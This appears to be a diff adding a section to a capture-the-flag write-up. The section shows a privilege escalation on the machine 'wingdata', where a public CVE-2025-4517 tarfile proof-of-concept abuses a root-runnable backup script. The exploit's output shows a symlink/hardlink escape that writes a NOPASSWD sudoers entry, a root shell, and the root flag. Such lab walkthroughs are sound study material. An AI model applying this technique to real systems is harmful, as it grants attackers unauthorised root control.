@@ -218,3 +218,49 @@ hashcat -m 1410 -a 0 hash /usr/share/wordlists/rockyou.txt --show
 
 It took me a while to figure out the salt but after a hint i managed to figure it out.
 
+We get the user.txt and its time to enumerate the machine. We run sudo -l and we are able to see a python script that we are able to run as root. After reading and doing research on the script we can see that the script is vulnerable to writing outside the extraction directory.
+
+We are able to find a poc exploit. https://github.com/AzureADTrent/CVE-2025-4517-POC
+
+
+```bash
+wacky@wingdata:~$ python3 CVE-2025-4517-POC.py 
+
+╔═══════════════════════════════════════════════════════════╗
+║     CVE-2025-4517 Tarfile Exploit                         ║
+║     Privilege Escalation via Symlink + Hardlink Bypass    ║
+╚═══════════════════════════════════════════════════════════╝
+    
+[*] Target user: wacky
+[*] Creating exploit tar for user: wacky
+[*] Phase 1: Building nested directory structure...
+[*] Phase 2: Creating symlink chain for path traversal...
+[*] Phase 3: Creating escape symlink to /etc...
+[*] Phase 4: Creating hardlink to /etc/sudoers...
+[*] Phase 5: Writing sudoers entry...
+[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
+[*] Deploying exploit to: /opt/backup_clients/backups/backup_9999.tar
+[+] Exploit deployed successfully
+[*] Triggering extraction via vulnerable script...
+[+] Backup: backup_9999.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn_9999
+[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999
+
+[+] Extraction completed
+[*] Verifying exploit success...
+[+] SUCCESS! User 'wacky' added to sudoers
+[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL
+
+============================================================
+[+] EXPLOITATION SUCCESSFUL!
+[+] User 'wacky' now has full sudo privileges
+[+] Get root with: sudo /bin/bash
+============================================================
+
+[?] Spawn root shell now? (y/n): y
+
+[*] Spawning root shell...
+[*] Run: sudo /bin/bash
+root@wingdata:/home/wacky# cat /root/root.txt
+1cf62c51ac807190b355b866cb205f09
+```
